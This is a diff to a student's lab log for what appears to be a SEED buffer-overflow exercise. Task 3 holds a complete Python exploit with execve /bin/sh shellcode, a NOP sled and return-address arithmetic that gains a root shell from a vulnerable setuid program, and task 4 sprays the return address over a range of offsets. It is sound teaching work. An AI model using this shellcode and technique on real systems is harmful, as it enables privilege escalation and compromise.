@@ -100,6 +100,70 @@ Because the compilation and setup commands are already included in Makefile, we 
 ![CreateShell](../docs/week5/log5task2.png)
 
 
+# Task 3
+
+When running GDB, we got the ebp value and the buffer's address with the following steps:
+
+![Ebp_bufferaddr](../docs/week5/log5task3_1.png)
+
+After knowing these values, we need to prepare the *badfile*, so the next step is to complete the *exploit.py* file with the values we got from GDB.
+
+Because this is an Attack on 32-bit Program, in the shellcode variable we insert the 32-bit shellcode from the *call_shellcode.c* file.
+
+![ShellValue](../docs/week5/log5task3_2.png)
+
+Then, we need to set the start position to the end of the buffer. Since the buffer's length is 517, the position is:
+
+![StartValue](../docs/week5/log5task3_3.png)
+
+Furthermore, we now need to change the return address to one that will run our code. If the address points to any NOP's that come before the shellcode, it will run. So, we just need to add the *ebp* value to the *start* value.
+
+![ReturnValue](../docs/week5/log5task3_4.png)
+
+Finally, the only thing left to do before running our attack is to change the offset value, which can be done with the opeation *ebp - buffer + 4*
+
+![OffsetValue](../docs/week5/log5task3_5.png)
+
+After completing the python script, we end up with:
+
+```
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+
+start = 517-len(shellcode)         # Change this number 
+content[start:start + len(shellcode)] = shellcode
+# Decide the return address value 
+# and put it somewhere in the payload
+
+ret    = 0xffffcb28 + start           # Change this number 
+offset = 0xffffcb28  - 0xffffcabc + 4 # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+ ```
+
+ After running the script and creating the badfile, we just need to run *stack-L1*. This opens a shell and we can verify through the *whoami* command that we have a root shell:
+
+
+![NewShell](../docs/week5/log5task3_6.png)
 
 
 # Task 4
@@ -111,15 +175,20 @@ At the start of this task, we use gdb to find the buffer adress, ignoring the bu
 We only know that it is between 100 and 200 so we populate our ret variable with the values we got and define some bounds. Then we run this cycle to populate the 'content' array with the bytes from the 'ret' variable. 
 
 ```
+start =  517 - len(shellcode)# Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
 ret    = 0xffffcac0 + start      # Change this number 
-lowerbound = 100
-upperbound = 200                        # Change this number 
+upper = 100
+lower = 200                        # Change this number 
 
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
 temp = (ret).to_bytes(L,byteorder='little')
 
-for offset in range(lowerbound, upperbound + L, L):
-    content[offset:offset + L] = temp 
+for offset in range(upper, lower + L, L):
+    content[offset:offset + L] = temp
 ```
 
 Finally, by running the exploit we ge access to the shell.
